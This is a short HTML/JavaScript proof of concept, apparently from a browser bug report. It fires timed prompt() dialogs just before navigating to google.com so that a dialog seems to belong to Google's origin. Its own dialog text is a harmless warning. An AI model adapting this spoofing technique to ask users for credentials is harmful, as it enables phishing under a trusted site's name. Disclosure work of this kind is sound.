<script>
history.pushState({}, "", "#poc");
window.addEventListener("pagehide", () => {});
window.addEventListener("beforeunload", () => {});

setTimeout(() => {
  // Burst prompts BEFORE top-level navigation
  [0, 30, 60].forEach(delay => {
    setTimeout(() => {
      try {
        prompt("fake.google.com\n⚠️ Do not sign into your account", "");
      } catch(e){}
    }, delay);
  });

  // Trigger top-level navigation AFTER prompt attempts
  setTimeout(() => {
    location.href = "https://www.google.com";
  }, 90); // navigation slightly delayed
}, 120);
</script>
